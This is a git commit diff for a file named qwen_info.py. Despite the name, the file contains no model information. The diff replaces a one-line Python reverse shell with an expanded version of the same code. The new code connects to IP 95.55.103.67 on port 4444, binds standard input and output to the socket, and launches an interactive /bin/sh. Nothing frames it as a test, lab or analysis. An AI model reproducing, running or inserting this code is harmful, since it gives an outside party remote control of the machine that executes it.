d37e9f4740c14154d1dc491fc54806b8f014f6a4
Papanapervom <74345942+Papanapervom@users.noreply.github.com>
2026-04-15 04:17:14 +0300

    qwen_info.py

--- qwen_info.py
+++ qwen_info.py
@@ -1,3 +1,10 @@
-python3 -c '
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("95.55.103.67",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
-'
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("95.55.103.67", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
